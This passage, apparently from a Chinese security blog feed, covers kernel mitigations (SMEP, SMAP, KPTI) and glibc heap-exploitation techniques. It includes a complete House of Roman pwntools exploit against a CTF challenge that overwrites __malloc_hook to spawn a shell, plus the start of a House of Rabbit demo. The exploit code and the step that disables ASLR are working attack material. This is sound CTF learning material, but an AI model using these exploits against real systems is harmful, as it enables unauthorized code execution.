内核态不可执行用户态的代码</p><p>ARM里叫做PXN</p><p>CR4寄存器中的第<strong>20</strong>位来标记</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu开启smep     -cpu qemu64-v1,smep</span><br></pre></td></tr></table></figure><p>Supervisor Mode <strong>Access</strong> Prevention 管理模式访问保护 内核态不可访问用户态的数据</p><p>ARM里叫做PAN</p><p>CR4寄存器中的第<strong>21</strong>位来标记</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu开启smep     -cpu qemu64-v1,smap</span><br></pre></td></tr></table></figure><h3 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a><a href="https://zhuanlan.zhihu.com/p/137277724">KPTI</a></h3><p><img src="/2023/08/08/first-kernelpwn/image-20230811165305116.png" alt="image-20230811165305116"></p><p>Kernel Page Table Isolation 用户态不可看到内核态的页表；内核态<strong>不可执行</strong>用户态的代码</p><p>KPTI的发明也修复了Meltdown漏洞</p><ul><li>内核态中的页表包括用户空间内存的页表和内核空间内存的页表， x86_64 的 PTI 机制中，内核态的用户空间内存映射部分被全部标记为不可执行</li><li>用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu开启smep -append ”kpti=1“</span><br><span class="line">    关闭   -append ”nopti“</span><br></pre></td></tr></table></figure><p>Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><h4 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h4><p><code>/proc/sys/kernel/dmesg_restrict</code></p><p>该选项用于控制是否可以使用 <code>dmesg</code> 来查看内核日志 </p><ul><li>0 没有任何限制</li><li>1 只有具有 <code>CAP_SYSLOG</code> 权限的用户才可以通过 <code>dmesg</code> 命令来查看内核日志。</li></ul><h4 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h4><p> <code>/proc/sys/kernel/kptr_restrict</code></p><p>该选项用于控制在输出内核地址时施加的限制,如通过&#x2F;proc</p><ul><li>0：默认情况下，没有任何限制。</li><li>1：使用 <code>％pK</code> 输出的内核指针地址将被替换为 0，除非用户具有 CAP_SYSLOG 特权，并且 group id 和真正的 id 相等。</li><li>2：使用 <code>％pK</code> 输出的内核指针都将被替换为 0 ，即与权限无关。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Roman</title>
      <link href="/2023/08/06/House-Of-Roman/"/>
      <url>/2023/08/06/House-Of-Roman/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack 和 Unsortbin attack 结合的bypass ALSR，利用 12-bit 的爆破，在有uaf和off by one但没办法泄露地址时，<strong>局部写 减少随机化的程度，从而给出爆破的可能</strong></p><h2 id="demo分析"><a href="#demo分析" class="headerlink" title="demo分析"></a>demo分析</h2><p><a href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/c/p/h/House-Of-Roman&gt; checksec ./new_chall </span><br><span class="line">[*] &#x27;/mnt/hgfs/share/ctfwiki/pwn/heap/House-Of-Roman/new_chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>write_chunk有off by one</p><p>free_chunk有uaf 和 double free</p><p>思路大致就是下面两个方面</p><ul><li><p>利用unsortedbin attach 往malloc_hook里写入unsortedbin的值</p></li><li><p>利用fastbin attach来控制malloc_hook，12bit局部写malloc_hook里unsortedbin的值为ogg</p></li></ul><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) # <span class="number">0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) # d0</span><br><span class="line"><span class="title function_">create</span><span class="params">(<span class="number">0x68</span>,<span class="number">2</span>)</span>  # 0x70</span><br><span class="line"></span><br><span class="line">fake = b<span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  #<span class="meta"># fake size</span></span><br></pre></td></tr></table></figure><p>首先把chunk1+0x78处写上size0x71用于后面fastbinattach</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807144531230.png" alt="image-20230807144531230"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)把unsortbin写入</span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807144800100.png" alt="image-20230807144800100"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x68,3)  # b</span><br><span class="line">create(0x68,15)</span><br><span class="line">create(0x68,18)</span><br><span class="line">over = b&quot;A&quot;*0x18  # off by one</span><br><span class="line">over += b&quot;\x71&quot;  # set chunk  1&#x27;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span class="line">free(2)</span><br><span class="line">free(3)</span><br><span class="line">heap_po = b&quot;\x20&quot;</span><br><span class="line"># b()</span><br><span class="line">edit(3,heap_po)</span><br></pre></td></tr></table></figure><p>利用off by one和uaf把chunk1放到fastbin链表</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807145444749.png" alt="image-20230807145444749"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__malloc_hook</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 &lt;__malloc_hook&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">find_fake_fast 0x7ffff7dd1b10 0x70</span></span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0x7ffff7dd1aed</span><br><span class="line">prev_size: 0x-822fda0000000</span><br><span class="line">size: 0x7f</span><br><span class="line">fd: 0x-856d160000000</span><br><span class="line">bk: 0x-856d58fffff81</span><br><span class="line">fd_nextsize: 0x7f</span><br><span class="line">bk_nextsize: 0x00</span><br></pre></td></tr></table></figure><p>在mallochook上方找一个可以绕过大小检测的堆块，利用uaf把他链入fastbin里</p><p><img src="/2023/08/06/House-Of-Roman/image-20230807145855329.png" alt="image-20230807145855329"></p><p>然后就可以申请出来0x7ffff7dd1aed控制mallochook值了</p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br></pre></td></tr></table></figure><p>用来把坏掉的fastbin修复</p><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>接下来就是unsortedbin攻击</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">po = b<span class="string">&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += b<span class="string">&quot;\x00\x1b&quot;</span> #malloc_hook0x7ffff7dd1b10<span class="number">-0x10</span>的位置</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807150730458.png" alt="image-20230807150730458"></p><p><img src="/2023/08/06/House-Of-Roman/image-20230807150811005.png" alt="image-20230807150811005"></p><p>然后create(0xc8,1)把bck-&gt;fd  即malloc_hook里写入unsorted_chunks的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">over = b<span class="string">&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="meta"># padding for malloc_hook</span></span><br><span class="line">over += b<span class="string">&quot;\xa4\xd3\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">b()</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>利用之前申请到的包含malloc-hook的堆来修改unsorted_chunks为ogg，free时触发malloc_printerr 从而触发mallochook的ogg</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在第四步malloc_hook和第七步的ogg时需要爆破的，由于aslr按照页来随机，所以后面12bit的数字是不变的，我们分析时将aslr关闭<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>,写完exp后再打开运行多次exp，就会有机率爆破到地址一样的情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in `seq 1 5000`; do python exp.py; done;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn</span><br><span class="line"><span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./new_chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    menu()</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x931&#x27;)#free</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x71</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"><span class="comment">##free掉1到unsortbin，再申请出来就会有unsortedbin地址</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">3</span>)  <span class="comment"># b</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">18</span>)</span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span>  <span class="comment"># off by one</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span>  <span class="comment"># set chunk  1&#x27;s size --&gt; 0x71</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#利用uaf把堆块1链入fastbiin</span></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"><span class="comment">#修改fd为mallochook上方</span></span><br><span class="line">malloc_hook_nearly = <span class="string">b&quot;\xed\x1a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,malloc_hook_nearly)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把mallochook包含到堆块里</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#修复坏掉的fastbin</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x09B8&#x27;)#malloc</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment"># unsortedbin attach</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x1b&quot;</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ACF&#x27;)#edit</span></span><br><span class="line">dbpie(<span class="string">&#x27;0x09B8&#x27;</span>)<span class="comment">#malloc</span></span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用之前申请的包含mallochook的堆块去局部覆写malloc_hook</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">0x13</span>   <span class="comment"># padding for malloc_hook</span></span><br><span class="line">over += <span class="string">b&quot;\xa4\xd2\xaf&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;***\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    resp = io.recv(<span class="number">4</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a52226</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7a5227a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afd3a4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">0x7ffff7afe247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/08/06/House-Of-Roman/image-20230807161504915.png" alt="image-20230807161504915"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Rabbit</title>
      <link href="/2023/08/05/House-of-Rabbit/"/>
      <url>/2023/08/05/House-of-Rabbit/</url>
      
        <content type="html"><![CDATA[<p>运用在 fastbin attack </p><ul><li>可以修改fastbin的fd指针或size</li><li>可以触发malloc consolidate，malloc consolidate会把fastbin的堆块根据周围堆块状态进行合并，放入合适的bin里</li></ul><p> house of rabbit 利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>测试环境2.23</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk4;</span><br><span class="line">    <span class="type">void</span>* dummies[<span class="number">7</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发fastbin合并</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> chunk4 &#x3D; malloc(0x1000)前</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602050 —▸ 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602050</span></span><br><span class="line">00:0000│     0x602050 ◂— 0x0</span><br><span class="line">01:0008│     0x602058 ◂— 0x51 /* &#x27;Q&#x27; */</span><br><span class="line">02:0010│ r8  0x602060 —▸ 0x602000 ◂— 0x0</span><br><span class="line">03:0018│     0x602068 ◂— 0x0</span><br></pre></td></tr></table></figure><p> chunk4 &#x3D; malloc(0x1000)后</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x602000 —▸ 0x7ffff7dd1c08 (main_arena+232) ◂— 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602000</span></span><br><span class="line">00:0000│   0x602000 ◂— 0x0</span><br><span class="line">01:0008│   0x602008 ◂— 0xa1</span><br><span class="line">02:0010│   0x602010 —▸ 0x7ffff7dd1c08 (main_arena+232) —▸ 0x7ffff7dd1bf8 (main_arena+216) —▸ 0x7ffff7dd1be8 (main_arena+200) —▸ 0x7ffff7dd1bd8 </span><br></pre></td></tr></table></figure><h3 id="修改size"><a href="#修改size" class="headerlink" title="修改size"></a>修改size</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk4;</span><br><span class="line">    <span class="type">void</span>* dummies[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1[<span class="number">-1</span>] = <span class="number">0xa1</span>;</span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发fastbin合并</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk4 &#x3D; malloc(0x1000);后chunk1大小会重叠笼罩chunk2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x602050 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602050 /* &#x27;P `&#x27; */</span><br><span class="line">0xa0: 0x602000 —▸ 0x7ffff7dd1c08 (main_arena+232) ◂— 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602050</span></span><br><span class="line">00:0000│   0x602050 ◂— 0x0</span><br><span class="line">01:0008│   0x602058 ◂— 0x51 /* &#x27;Q&#x27; */</span><br><span class="line">02:0010│   0x602060 —▸ 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x7ffff7dd1ba8 (main_arena+136) —▸ 0x7ffff7dd1b98 (main_arena+120) —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— ...</span><br><span class="line">... ↓</span><br><span class="line">04:0020│   0x602070 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602000</span></span><br><span class="line">00:0000│   0x602000 ◂— 0x0</span><br><span class="line">01:0008│   0x602008 ◂— 0xa1</span><br><span class="line">02:0010│   0x602010 —▸ 0x7ffff7dd1c08 (main_arena+232) —▸ 0x7ffff7dd1bf8 (main_arena+216) —▸ 0x7ffff7dd1be8 (main_arena+200) —▸ 